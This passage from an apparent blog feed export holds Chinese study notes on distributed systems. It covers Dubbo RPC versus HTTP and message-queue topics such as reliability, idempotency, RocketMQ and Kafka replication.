<p>6、再通过交换成将DubboInvoker对象包装成一个Reuqest对象，该对象通过<mark>序列化</mark>通过NettyClient传输到服务提供者的NettyServer端；</p>
<p>7、到了服务提供者这边，再通过反序列化、协议解密等操作生成一个DubboExporter对象,再层层传递处理,会生成一个服务提供端的Invoker对象；</p>
<p>8、这个Invoker对象会调用本地服务，获得结果再通过层层回调返回到服务消费者，服务消费者拿到结果后，再解析获得最终结果。</p>
<h2 id="1-3-Invoker">1.3 Invoker</h2>
<p><code>Invoker</code> 就是 Dubbo 对远程调用的抽象。</p>
<h2 id="1-4-负载均衡策略">1.4 负载均衡策略</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>随机</p>
</li>
<li class="lvl-2">
<p>轮询</p>
</li>
<li class="lvl-2">
<p>一致性哈希</p>
</li>
<li class="lvl-2">
<p>最少活跃调用数</p>
</li>
</ul>
<h2 id="1-5-序列化协议">1.5 序列化协议</h2>
<p>JDK 自带的序列化、hessian2、JSON、Kryo、FST、Protostuff，ProtoBuf 等等。</p>
<blockquote>
<p>[!question] 如何解决重载问题？</p>
</blockquote>
<h1>2 RPC和HTTP</h1>
<p>现在电脑上装的各种联网软件，比如 xx 管家，xx 卫士，它们都作为客户端（Client） 需要跟服务端（Server） 建立连接收发消息，此时都会用到应用层协议，在这种 Client/Server (C/S) 架构下，它们可以使用自家造的 RPC 协议，因为它只管连自己公司的服务器就 ok 了。</p>
<p>但有个软件不同，浏览器（Browser） ，不管是 Chrome 还是 IE，它们不仅要能访问自家公司的<strong>服务器（Server）</strong> ，还需要访问其他公司的网站服务器，因此它们需要有个统一的标准，不然大家没法交流。于是，HTTP 就是那个时代用于统一 <strong>Browser/Server (B/S)</strong> 的协议。</p>
<p>也就是说在多年以前，<strong>HTTP 主要用于 B/S 架构，而 RPC 更多用于 C/S 架构。但现在其实已经没分那么清了，B/S 和 C/S 在慢慢融合。</strong> 很多软件同时支持多端，比如某度云盘，既要支持<strong>网页版</strong>，还要支持<strong>手机端和 PC 端</strong>，如果通信协议都用 HTTP 的话，那服务器只用同一套就够了。而 RPC 就开始退居幕后，一般用于公司内部集群里，各个微服务之间的通讯。</p>
<h2 id="2-1-HTTP和RPC区别">2.1 HTTP和RPC区别</h2>
<p>浏览器-服务器客户端-服务端</p>
<p>重载实现</p>
<h3 id="2-1-1-服务发现">2.1.1 服务发现</h3>
<p>首先要向某个服务器发起请求，你得先建立连接，而建立连接的前提是，你得知道 <strong>IP 地址和端口</strong> 。这个找到服务对应的 IP 端口的过程，其实就是 <strong>服务发现</strong>。</p>
<p>在 <strong>HTTP</strong> 中，你知道服务的域名，就可以通过 <strong>DNS 服务</strong> 去解析得到它背后的 IP 地址，默认 <strong>80 端口</strong>。</p>
<p>而 <strong>RPC</strong> 的话，就有些区别，一般会有专门的中间服务去保存服务名和 IP 信息，比如 <strong>Consul、Etcd、Nacos、ZooKeeper，甚至是 Redis</strong>。想要访问某个服务，就去这些中间服务去获得 IP 和端口信息。由于 DNS 也是服务发现的一种，所以也有基于 DNS 去做服务发现的组件，比如 <strong>CoreDNS</strong>。</p>
<p>可以看出服务发现这一块，两者是有些区别，但不太能分高低。</p>
<h3 id="2-1-2-底层连接方式">2.1.2 底层连接方式</h3>
<p>以主流的 <strong>HTTP1.1</strong> 协议为例，其默认在建立底层 TCP 连接之后会一直保持这个连接（<strong>keep alive</strong>），之后的请求和响应都会复用这条连接。</p>
<p>而 <strong>RPC</strong> 协议，也跟 HTTP 类似，也是通过建立 TCP 长链接进行数据交互，但不同的地方在于，RPC 协议一般还会再建个 <strong>连接池</strong>，在请求量大的时候，建立多条连接放在池内，要发数据的时候就从池里取一条连接出来，用完放回去，下次再复用，可以说非常环保。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202407302303572.png" alt="image.png"></p>
<h3 id="2-1-3-传输的内容">2.1.3 传输的内容</h3>
<p>基于 TCP 传输的消息，说到底，无非都是 <strong>消息头 Header 和消息体 Body。</strong></p>
<p><strong>Header</strong> 是用于标记一些特殊信息，其中最重要的是 <strong>消息体长度</strong>。</p>
<p><strong>Body</strong> 则是放我们真正需要传输的内容，而这些内容只能是二进制 01 串，毕竟计算机只认识这玩意。所以 TCP 传字符串和数字都问题不大，因为字符串可以转成编码再变成 01 串，而数字本身也能直接转为二进制。但结构体呢，我们得想个办法将它也转为二进制 01 串，这样的方案现在也有很多现成的，比如 <strong>JSON，Protocol Buffers (Protobuf)</strong> 。</p>
<p>这个将结构体转为二进制数组的过程就叫 <strong>序列化</strong> ，反过来将二进制数组复原成结构体的过程叫 <strong>反序列化</strong>。</p>
<h1>3 参考</h1>
<ol>
<li class="lvl-3">
<p><a href="https://javaguide.cn/distributed-system/rpc/http_rpc.html">有了 HTTP 协议，为什么还要有 RPC ？ | JavaGuide</a></p>
</li>
<li class="lvl-3">
<p><a href="https://www.cnblogs.com/mikechenshare/p/16818068.html#:~:text=%E6%9C%AC%E6%96%87%E6%B7%B1%E5%85%A5%E8%AF%A6%E8%A7%A3%20D">Dubbo 原理和机制详解 (非常全面) - mikechen的互联网架构 - 博客园 (cnblogs.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/fudaihb/article/details/139924183">深入理解 Dubbo：分布式服务框架的核心原理与实践_dubbo的实现架构-CSDN博客</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>RPC</tag>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>消息队列</title>
    <url>/2024/04/27/%E6%A1%86%E6%9E%B6/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1>1 消息队列</h1>
<p><strong>使用队列来通信</strong>的组件。它的本质，就是个<strong>转发器</strong>，包含<strong>发消息、存消息、消费消息</strong>的过程。</p>
<p><strong>消息队列</strong> 是指利用 <strong>高效可靠</strong> 的 <strong>消息传递机制</strong> 进行与平台无关的 <strong>数据交流</strong>，并基于<strong>数据通信</strong>来进行分布式系统的集成。</p>
<p>通过提供 <strong>消息传递</strong> 和 <strong>消息排队</strong> 模型，它可以在 <strong>分布式环境</strong> 下提供 <strong>应用解耦</strong>、<strong>弹性伸缩</strong>、<strong>冗余存储</strong>、<strong>流量削峰</strong>、<strong>异步通信</strong>、<strong>数据同步</strong> 等等功能，其作为 <strong>分布式系统架构</strong> 中的一个重要组件，有着举足轻重的地位。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404291638324.png" alt="image.png"></p>
<h1>2 作用</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>异步处理：用户抽奖成功后，直接返回中奖消息，实际的结果落库通过消息队列处理。</p>
</li>
<li class="lvl-2">
<p>应用解耦：如果没有消息队列，每当一个新的业务接入，我们都要在主系统调用新接口、或者当我们取消某些业务，我们也得在主系统删除某些接口调用。有了消息队列，我们只需要关心消息是否送达了队列，至于谁希望订阅，接下来收到消息如何处理，是下游的事情，无疑极大地减少了开发和联调的工作量。</p>
</li>
<li class="lvl-2">
<p>流量削峰：可能导致消息积压，在秒杀情景下，将用户请求写入消息队列，再进行后续业务处理</p>
</li>
<li class="lvl-2">
<p>消息通讯：消息队列内置了高效的通信机制，可用于消息通讯。如实现<code>点对点消息队列、聊天室等</code>。</p>
</li>
<li class="lvl-2">
<p>缓存与数据库同步：订阅数据库binlog日志，通过Canal写入MQ，在写入缓存。</p>
</li>
</ul>
<p>分布式事务、顺序保证、延时/定时处理、</p>
<h1>3 存在问题</h1>
<h2 id="3-1-消息可靠性（消息丢失）">3.1 消息可靠性（消息丢失）</h2>
<p>生产者不丢消息、消息队列不丢消息、消费者不丢消息</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>生产者：同步发送，发送成功返回ACK，发送失败重试（<strong>重复发送</strong>）</p>
</li>
<li class="lvl-2">
<p>消息队列：消息持久化到磁盘（同步刷盘、异步刷盘）、主从集群部署（同步复制、异步复制）</p>
</li>
<li class="lvl-2">
<p>消费者：消费成功确认、死信队列、消息补偿机制。</p>
</li>
<li class="lvl-2">
<p>生产阶段，Producer创建消息经过网路传输发送到Broker端</p>
<ul class="lvl-2">
<li class="lvl-6">检查发送状态</li>
<li class="lvl-6">失败补偿机制</li>
<li class="lvl-6">异步发送回调</li>
</ul>
</li>
<li class="lvl-2">
<p>存储阶段，消息在Broker端存储</p>
<ul class="lvl-2">
<li class="lvl-6">集群部署</li>
<li class="lvl-6">主备都写成功，才向应用返回成功</li>
</ul>
</li>
<li class="lvl-2">
<p>消费阶段，Consumer从Broker上拉取消息，讲过网路传输发送到Consumer</p>
<ul class="lvl-2">
<li class="lvl-6">失败重试，消费失败回应RECONSUMER_LATER</li>
<li class="lvl-6">死信队列处理，堆积监控</li>
</ul>
</li>
</ul>
<blockquote>
<p>[!note]<br>
持久化存储主从：主节点的数据会同步给从节点，主节点出问题后，从节点可以顶上来提供服务，同时从节点也可以提供读的操作，为主节点减轻压力。（高可用）分片：在设计的时候还要考虑数据分片的场景，一个Topic的数据可以分成很多份进行存储，分别存储在不同的Broker上，这样当磁盘不够的时候，可以通过增加Broker的节点来扩容。（高性能）</p>
</blockquote>
<h2 id="3-2-消息顺序性">3.2 消息顺序性</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>消息发到同一个队列，当M1发送完收到ack后，M2再发送（无法保证消费者接收顺序）</p>
</li>
<li class="lvl-2">
<p>将M1和M2发送到同一个消费者，发送M1后，等到消费端ACK成功后，才发送M2</p>
</li>
</ul>
<blockquote>
<p>Kafka</p>
<ul class="lvl-1">
<li class="lvl-2">1个Topic只对应一个Partition</li>
<li class="lvl-2">发送消息的时候指定key或Partition</li>
<li class="lvl-2">Kafka 中发送 1 条消息的时候，可以指定<code> topic, partition, key,data（数据）</code> 4 个参数。如果你发送消息的时候指定了 Partition 的话，所有消息都会被发送到指定的 Partition。并且，同一个 key 的消息可以保证只发送到同一个 partition，这个我们可以采用表/对象的 id 来作为 key 。</li>
</ul>
</blockquote>
<h2 id="3-3-消息重复-重复消费">3.3 消息重复-&gt;重复消费</h2>
<h3 id="3-3-1-产生情况">3.3.1 产生情况</h3>
<p>在互联网应用中，尤其在网络不稳定的情况下，消息有可能会出现重复，这个重复简单可以概括为以下两种情况：</p>
<blockquote>
<p>[!note] 生产者重复生产：生产者发送的消息MQ成功接收，但是响应超时，生产者再次投递相同消息，直到返回成功ACK<br>
发送时消息重复【消息 MessageID 相同】：<br>
MQ Producer发送消息场景下，消息已成功发送到服务端并完成持久化，此时网络闪断或者客户端宕机导致服务端应答给客户端失败。如果此时 MetaQ Producer 意识到消息发送失败并尝试再次发送消息，MetaQ 消费者后续会收到两条内容相同 MessageID 相同的消息。</p>
</blockquote>
<blockquote>
<p>[!note] MQ重试机制：消费者消费成功但是响应MQ超时，MQ重新投递同一消息（拉取消息、业务逻辑处理、提交消费位移），已经消费的数据没有成功提交offset<br>
消费时消息重复【消息MessageID相同】；<br>
MetaQ Consumer消费消息场景下，消息已投递到消费者并完成业务处理，当客户端给服务端反馈应答的时候网络闪断。为了保证消息至少被消费一次，MetaQ服务端将在网络恢复后再次尝试投递之前已被处理过的消息，MetaQ 消费者后续会收到两条内容相同并且Message ID 也相同的消息。</p>
</blockquote>
<blockquote>
<p>[!note] 重平衡(re-balance)：消费者消费成功未提交消费位移挂掉，进行重平衡被另一消费者消费负载均衡重新平衡过程中导致的消息重复【不同机器收到消息 Message ID 相同的消息】<br>
MetaQ的负载均衡逻辑都在客户端，每台客户端根据自己在ConsumerlD下所有消费者的排序默认每20s计算一次<mark>负载均衡结果，确定自己要消费的队列</mark>。因为每台客户端的启动时间不一样，所以每台机器进行负载均衡计算的时间也不一样，如果有consumer进行上下线，那么每个consumer感知到的时间也不一样（最终都会感知到）。这个过程是个最终一致的过程，所以在客户端机器数有变化，并且所有consumer感知到之前，这个时候会出现一种现象，有consumer计算出来的负载均衡结果和其他consumer不一致，从而导致拉取到相同的队列，导致消费重复。在所有consumer做完一次reblance后，负载均衡结果将一致，不会再有此类重复。(客户端发布、扩缩容、网络抖动、集群队列数变更)</p>
</blockquote>
<h3 id="3-3-2-解决办法">3.3.2 解决办法</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>幂等：数据库唯一约束（主键、联合唯一索引、insert if not exist)，Redis 的 set、MySQL 的主键</p>
</li>
<li class="lvl-2">
<p>Redis缓存标记</p>
</li>
<li class="lvl-2">
<p>更新数据设置条件</p>
</li>
<li class="lvl-2">
<p>记录并检查操作</p>
</li>
<li class="lvl-2">
<p>不建议使用messageId作为幂等ID，建议业务自定义key去重</p>
</li>
</ul>
<h3 id="3-3-3-MQ幂等性">3.3.3 MQ幂等性</h3>
<blockquote>
<p>消息队列（MQ）中的幂等性是指无论消息被消费多少次，最终的效果应该是一致的。在分布式系统中，由于网络延迟、重试机制等原因，消息可能被处理多次，而幂等性可以确保系统的一致性。</p>
</blockquote>
<ol>
<li class="lvl-3">
<p><strong>唯一标识符：</strong> 每条消息都应该包含一个唯一的标识符（Message ID），该标识符可以用来检测消息的重复。当消息处理完成后，可以记录已处理的消息标识符，下次收到相同标识符的消息时，直接判断为重复消息，不再处理。</p>
</li>
<li class="lvl-3">
<p><strong>幂等性检测逻辑：</strong> 在消息的处理逻辑中加入幂等性检测的逻辑，确保同一消息在多次处理时不会产生不一致的结果。例如，在数据库中存储已处理消息的信息，每次处理消息前检查是否已经处理过。</p>
</li>
<li class="lvl-3">
<p><strong>版本号：</strong> 每个消息可以包含一个版本号，表示消息的版本信息。消费者在处理消息时，可以检查消息的版本号，如果版本号相同，即使消息重复到达，也可以认为是幂等的。</p>
</li>
<li class="lvl-3">
<p><strong>幂等性接口设计：</strong> 对于消息的消费者，可以设计幂等性接口，确保相同输入产生相同的输出。通过合理设计接口，消费者可以在处理相同消息时返回相同结果，保证了幂等性。</p>
</li>
<li class="lvl-3">
<p><strong>事务性操作：</strong> 如果消息的处理涉及到事务性操作，可以利用数据库事务的特性来保证幂等性。通过将消息的处理和数据库的更新放在同一个事务中，可以确保即使消息多次到达，数据库的状态也能正确更新。</p>
</li>
<li class="lvl-3">
<p><strong>分布式锁：</strong> 使用分布式锁机制，确保在同一时间只有一个消费者能够处理消息。这可以避免<code>多个消费者同时处理同一消息</code>，从而保证幂等性。</p>
</li>
<li class="lvl-3">
<p><strong>数据库唯一键</strong>：利用数据库的唯一约束（如唯一索引）来防止插入重复数据。 如果尝试插入重复数据，数据库将抛出异常，应用程序可以捕获此异常并相应处理。</p>
</li>
</ol>
<p>实现MQ的幂等性需要结合业务场景和具体的消息处理逻辑，采用合适的方式来防止重复处理相同的消息。选择合适的幂等性策略可以提高系统的可靠性和一致性。</p>
<h2 id="3-4-消息堆积">3.4 消息堆积</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>消费方消息堆积（提升消费者速度）</p>
<ul class="lvl-2">
<li class="lvl-6">增加资源，水平扩容，增加机器 or Topic队列数</li>
<li class="lvl-6">提升消费性能，优化消费逻辑，<mark>批量消费</mark></li>
<li class="lvl-6">排查是否存在bug，解决报错，顺序消息，某个队列单条消息消费失败，导致当前队列阻塞，堆积</li>
<li class="lvl-6">系统降级，服务重要业务，降低影响</li>
<li class="lvl-6">多线程消费</li>
</ul>
</li>
<li class="lvl-2">
<p>生产者消费堆积</p>
<ul class="lvl-2">
<li class="lvl-6">降低生产者生产速度，接口限流</li>
</ul>
</li>
</ul>
<h2 id="3-5-消费失败">3.5 消费失败</h2>
<p>考虑消息消费失败的重试次数，重试后仍然失败如何处理，要么阻塞，要么丢弃，或者保存到死信队列</p>
<h2 id="3-6-分布式事务">3.6 分布式事务</h2>
<p><strong>分布式应用必定涉及到各个系统之间的通信问题</strong><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404291641487.png" alt="image.png"></p>
<ol>
<li class="lvl-3">
<p>生产者产生消息，发送一条半事务消息到MQ服务器</p>
</li>
<li class="lvl-3">
<p>MQ收到消息后，将消息持久化到存储系统，这条消息的状态是待发送状态。</p>
</li>
<li class="lvl-3">
<p>MQ服务器返回ACK确认到生产者，此时MQ不会触发消息推送事件</p>
</li>
<li class="lvl-3">
<p>生产者执行本地事务</p>
</li>
<li class="lvl-3">
<p>如果本地事务执行成功，即commit执行结果到MQ服务器；如果执行失败，发送rollback。</p>
</li>
<li class="lvl-3">
<p>如果是正常的commit，MQ服务器更新消息状态为可发送；如果是rollback，即删除消息。</p>
</li>
<li class="lvl-3">
<p>如果消息状态更新为可发送，则MQ服务器会push消息给消费者。消费者消费完就回ACK。</p>
</li>
<li class="lvl-3">
<p>如果MQ服务器长时间没有收到生产者的commit或者rollback，它会反查生产者，然后根据查询到的结果执行最终状态。</p>
</li>
</ol>
<h1>4 消息模型</h1>
<h2 id="4-1-队列模型">4.1 队列模型</h2>
<p><code>生产者-队列-消费者</code><br>
多消费者：生产者需要知道具体消费者个数然后去复制对应数量的消息队列<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408171627743.png" alt="image.png"></p>
<p><strong>使用队列（Queue）作为消息通信载体，满足生产者与消费者模式，一条消息只能被一个消费者使用，未被消费的消息在队列中保留直到被消费或超时。</strong></p>
<p>多消费者情况下每一个消费者只能消费到部分消息。</p>
<h2 id="4-2-主题模型-发布订阅模型">4.2 主题模型(发布订阅模型)</h2>
<p><code>发布者-主题-订阅者</code><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408171628534.png" alt="image.png"></p>
<p>发布订阅模型（Pub-Sub） 使用<strong>主题（Topic）</strong> 作为消息通信载体，类似于<strong>广播模式</strong>；发布者发布一条消息，该消息通过主题传递给所有的订阅者，<strong>在一条消息广播之后才订阅的用户则是收不到该条消息的</strong>。</p>
<p><strong>在发布 - 订阅模型中，如果只有一个订阅者，那它和队列模型就基本是一样的了。所以说，发布 - 订阅模型在功能层面上是可以兼容队列模型的。</strong></p>
<h1>5 RPC、消息队列、HTTP</h1>
<h2 id="5-1-RPC-和消息队列的区别">5.1 RPC 和消息队列的区别</h2>
<p>RPC 和消息队列都是分布式微服务系统中重要的组件之一，下面我们来简单对比一下两者：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>从用途来看</strong>：RPC 主要用来解决两个服务的远程通信问题，不需要了解底层网络的通信机制。通过 RPC 可以帮助我们调用远程计算机上某个服务的方法，这个过程就像调用本地方法一样简单。消息队列主要用来降低系统耦合性、实现任务异步、有效地进行流量削峰。</p>
</li>
<li class="lvl-2">
<p><strong>从通信方式来看</strong>：RPC 是双向直接网络通讯，消息队列是单向引入中间载体的网络通讯。</p>
</li>
<li class="lvl-2">
<p><strong>从架构上来看</strong>：消息队列需要把消息存储起来，RPC 则没有这个要求，因为前面也说了 RPC 是双向直接网络通讯。</p>
</li>
<li class="lvl-2">
<p><strong>从请求处理的时效性来看</strong>：通过 RPC 发出的调用一般会立即被处理，存放在消息队列中的消息并不一定会立即被处理。</p>
</li>
</ul>
<p>RPC 和消息队列本质上是网络通讯的两种不同的实现机制，两者的用途不同，万不可将两者混为一谈</p>
<h1>6 RocketMQ、MetaQ</h1>
<h2 id="6-1-架构设计">6.1 架构设计</h2>
<p><a href="https://blog.csdn.net/ctwctw/article/details/107188474">RocketMQ的核心概念以及架构图_rocketmq架构图-CSDN博客</a><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408180010596.png" alt="image.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408172325784.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Broker</code>：消息队列服务器，主要负责消息的存储、投递和查询以及服务高可用保证。</p>
</li>
<li class="lvl-2">
<p><code>NameServer</code>： NameServer是整个消息队列中的状态服务器，集群的各个组件通过它来了解全局的信息。NameServer可以部署多个，相互之间独立，其他角色同时向多个NameServer机器上报状态信息。 <strong>注册中心</strong> ，主要提供两个功能：<mark>Broker 管理 和 路由信息管理</mark> 。 <code>Broker</code> 会将自己的信息注册到 <code>NameServer</code> 中，此时 <code>NameServer</code> 就存放了很多 <code>Broker</code> 的信息(Broker 的路由表)，消费者和生产者就从 <code>NameServer</code> 中获取路由表然后照着路由表的信息和对应的 <code>Broker</code> 进行通信(生产者和消费者定期会向 <code>NameServer</code> 去查询相关的 <code>Broker</code> 的信息)。</p>
</li>
<li class="lvl-3">
<p><code>Producer</code>：消息发布的角色，支持分布式集群方式部署。说白了就是生产者。</p>
</li>
<li class="lvl-2">
<p><code>Consumer</code>：消息消费的角色，支持分布式集群方式部署。支持以 push 推，pull 拉两种模式对消息进行消费。同时也支持集群方式和广播方式的消费，它提供实时消息订阅机制。说白了就是消费者。</p>
</li>
</ul>
<h2 id="6-2-分布式事务（事务消息）">6.2 分布式事务（事务消息）</h2>
<p>2PC、TCC 和事务消息(half 半消息机制)。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408180003536.png" alt="image.png"></p>
<div class="tips">
<p><em>RocketMQ如何保证高性能读写?</em><br>
零拷贝</p>
</div>
<h1>7 Kafka</h1>
<div class="tips">
<p>Kafka 是一个分布式流式处理平台</p>
<ul class="lvl-1">
<li class="lvl-2"><strong>消息队列</strong>：发布和订阅消息流，这个功能类似于消息队列，这也是 Kafka 也被归类为消息队列的原因。</li>
<li class="lvl-2"><strong>容错的持久方式存储记录消息流</strong>：Kafka 会把消息持久化到磁盘，有效避免了消息丢失的风险。</li>
<li class="lvl-2"><strong>流式处理平台：</strong> 在消息发布的时候进行处理，Kafka 提供了一个完整的流式处理类库。</li>
</ul>
</div>
<h2 id="7-1-Kafka架构">7.1 Kafka架构</h2>
<p>Kafka 将生产者发布的消息发送到 <strong>Topic（主题）</strong> 中，需要这些消息的消费者可以订阅这些 <strong>Topic（主题）</strong>。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406051118494.png" alt="image.png|575"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Producer（生产者）</strong> : 产生消息的一方。</p>
</li>
<li class="lvl-2">
<p><strong>Consumer（消费者）</strong> : 消费消息的一方。</p>
</li>
<li class="lvl-2">
<p><strong>Broker（代理）</strong> : Broker是Kafka集群中的一个节点，负责存储和处理消息。</p>
</li>
<li class="lvl-2">
<p><strong>Topic（主题）</strong> : Topic是消息的逻辑分类或主题。 Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
</li>
<li class="lvl-2">
<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。每个分区在物理上对应一个独立的日志文件</p>
</li>
</ul>
<blockquote>
<p>同一topic下不同partition中存储的是完整消息流的一部分，所有partition中数据相加是完整的消息流数据，partition中的数据是不一致的。分区存储在不同的broker提升并发处理能力<br>
<strong>Kafka 中的 Partition（分区） 实际上可以对应成为消息队列中的队列</strong></p>
</blockquote>
<h3 id="7-1-1-多副本机制">7.1.1 多副本机制</h3>
<p>Kafka为分区（Partition）引入了多副本（Replica）机制。分区（Partition）中的多个副本之间有一个leader， 其他副本称为 follower。我们发送的消息会被发送到 leader 副本，然后 follower 副本才能从 leader 副本中拉取消息进行同步。生产者和消费者只与leader副本交互，其他副本是leader副本的拷贝，它们的存在是为了保证消息存储的安全性。</p>
<h3 id="7-1-2-多分区-Partition-以及多副本-Replica">7.1.2 多分区(Partition)以及多副本(Replica)</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>多分区：Kafka 通过给特定 Topic 指定多个 Partition, 而各个 Partition 可以分布在不同的 Broker 上, 这样便能提供比较好的<mark>并发能力（负载均衡）</mark>。</p>
</li>
<li class="lvl-2">
<p>多副本：Partition 可以指定对应的 Replica 数, 这也极大地提高了<mark>消息存储的安全性</mark>, 提高了容灾能力，不过也相应的增加了所需要的存储空间。</p>
</li>
</ul>
<h3 id="7-1-3-Kafka中ISR">7.1.3 Kafka中ISR</h3>
<p>首先，ISR 的全称叫做：<mark>In-Sync Replicas （同步副本集）</mark>, 我们可以理解为和 leader 保持同步的所有副本的集合。</p>
<p>一个分区的所有副本集合叫做 AR（ Assigned Repllicas ） ，与 leader-replica 未能保持同步的副本集叫做 OSR（ Out-Sync Relipcas ）。</p>
<p>因此我们就能得到这么一个表示：AR = ISR + OSR，翻译一下就是一个分区的副本集分为同步集合和非同步集合两部分。</p>
<p>ISR 的作用：是通过副本机制实现消息高可靠，服务高可用时，不可缺少的一环</p>
<h3 id="7-1-4-Kafka丢失消息">7.1.4 Kafka丢失消息</h3>
<blockquote>
<p>leader中的数据还有一些没有被follower副本同步的话，会造成消息丢失</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>设置acks=all<br>
acks 的默认值即为 1，代表我们的消息被 leader 副本接收之后就算被成功发送。当我们配置 <strong>acks = all</strong> 表示只有所有 ISR 列表的副本全部收到消息时，生产者才会接收到来自服务器的响应</p>
</li>
<li class="lvl-2">
<p><strong>设置 replication.factor &gt;= 3</strong>：保证每个分区有3个副本</p>
</li>
<li class="lvl-2">
<p><strong>设置 min.insync.replicas &gt; 1（ISR）</strong>：消息至少写入2个副本才算发送成功</p>
</li>
</ul>
<p><a href="https://cloud.tencent.com/developer/article/2231968">说一说你对 Kafka 中 ISR 的理解-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h3 id="7-1-5-为什么Redis-Pub-Sub比Kafka更快一些？二者之间如何选取？">7.1.5 为什么Redis Pub/Sub比Kafka更快一些？二者之间如何选取？</h3>
<blockquote>
<p><strong>为什么Redis Pub/Sub比Kafka更快一些？</strong> Redis是一个内存数据库，其Pub/Sub功能将消息保存在内存中。由于内存访问速度通常远快于磁盘访问速度，因此Redis在处理实时性较高的消息推送时具有优势。此外，Redis的Pub/Sub模型相对简单，使得它在处理发布和订阅操作时的开销较小。 然而，Kafka是一个完整的系统，提供了高吞吐量、分布式的提交日志。它旨在处理大规模数据流，具有强大的持久化能力和容错性。Kafka的分布式架构和分区机制使得它能够在多个消费者之间实现负载均衡，从而提高整体处理能力。</p>
</blockquote>
<blockquote>
<p><strong>二者之间如何选取？</strong></p>
<p><strong>Redis PUB/SUB使用场景：</strong></p>
<ol>
<li class="lvl-3">
<p>消息持久性需求不高</p>
</li>
<li class="lvl-3">
<p>吞吐量要求不高</p>
</li>
<li class="lvl-3">
<p>可以忍受数据丢失</p>
</li>
<li class="lvl-3">
<p>数据量不大</p>
</li>
</ol>
<p><strong>Kafka使用场景：</strong>(上面以外的其他场景)</p>
<ol>
<li class="lvl-3">
<p>高可靠性</p>
</li>
<li class="lvl-3">
<p>高吞吐量</p>
</li>
<li class="lvl-3">
<p>持久性高</p>
</li>
<li class="lvl-3">
<p>多样化的消费处理模型</p>
</li>
</ol>
</blockquote>
<h2 id="7-2-Zookeeper和Kafka">7.2 Zookeeper和Kafka</h2>
<p>ZooKeeper 主要为 Kafka 提供<mark>元数据的管理</mark>的功能。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>Broker 注册</strong>：在 Zookeeper 上会有一个专门<strong>用来进行 Broker 服务器列表记录</strong>的节点。每个 Broker 在启动时，都会到 Zookeeper 上进行注册，即到 <code>/brokers/ids</code> 下创建属于自己的节点。每个 Broker 就会将自己的 IP 地址和端口等信息记录到该节点中去</p>
</li>
<li class="lvl-2">
<p><strong>Topic 注册</strong>：在 Kafka 中，同一个<strong>Topic 的消息会被分成多个分区</strong>并将其分布在多个 Broker 上，<strong>这些分区信息及与 Broker 的对应关系</strong>也都是由 Zookeeper 在维护。比如我创建了一个名字为 my-topic 的主题并且它有两个分区，对应到 zookeeper 中会创建这些文件夹：<code>/brokers/topics/my-topic/Partitions/0</code>、<code>/brokers/topics/my-topic/Partitions/1</code></p>
</li>
<li class="lvl-2">
<p><strong>负载均衡</strong>：上面也说过了 Kafka 通过给特定 Topic 指定多个 Partition, 而各个 Partition 可以分布在不同的 Broker 上, 这样便能提供比较好的并发能力。 对于同一个 Topic 的不同 Partition，Kafka 会尽力将这些 Partition 分布到不同的 Broker 服务器上。当生产者产生消息后也会尽量投递到不同 Broker 的 Partition 里面。当 Consumer 消费的时候，Zookeeper 可以根据当前的 Partition 数量以及 Consumer 数量来实现动态负载均衡。</p>
</li>
</ul>
<h2 id="7-3-Kafka重试机制">7.3 Kafka重试机制</h2>
<h3 id="7-3-1-重试失败后的数据如何再次处理">7.3.1 重试失败后的数据如何再次处理</h3>
<p>死信队列（Dead Letter Queue，简称 DLQ） 是消息中间件中的一种特殊队列。它主要用于处理无法被消费者正确处理的消息，通常是因为消息格式错误、处理失败、消费超时等情况导致的消息被&quot;丢弃&quot;或&quot;死亡&quot;的情况。当消息进入队列后，消费者会尝试处理它。如果处理失败，或者超过一定的重试次数仍无法被成功处理，消息可以发送到死信队列中，而不是被永久性地丢弃。在死信队列中，可以进一步分析、处理这些无法正常消费的消息，以便定位问题、修复错误，并采取适当的措施。</p>
<h1>8 参考</h1>
<p><a href="https://zhuanlan.zhihu.com/p/471374718">十道经典消息队列面试题 - 知乎 (zhihu.com)</a><br>
<a href="https://mp.weixin.qq.com/s?__biz=MzkyMzU5Mzk1NQ==&amp;mid=2247506349&amp;idx=1&amp;sn=47b8ae3a94176440a6e5d5ad3505b4f3&amp;source=41#wechat_redirect">聊聊幂等设计 (qq.com)</a><br>
